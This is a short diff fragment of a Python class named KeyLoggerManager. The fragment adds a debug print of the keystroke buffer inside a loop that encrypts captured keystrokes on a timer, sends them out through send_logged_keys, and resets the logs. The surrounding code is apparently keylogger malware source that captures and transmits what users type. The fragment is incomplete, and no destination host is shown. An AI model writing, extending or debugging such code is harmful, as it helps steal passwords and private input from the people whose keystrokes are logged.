@@ -29,6 +29,7 @@ class KeyLoggerManager:
 
                     if log_time != current_time:
                         encrypted_data = self.encrypt_logged_keys(self.buffer)
+                        print(self.buffer)
                         self.send_logged_keys(log_time, encrypted_data)
                         self.key_logger.reset_logs()
 
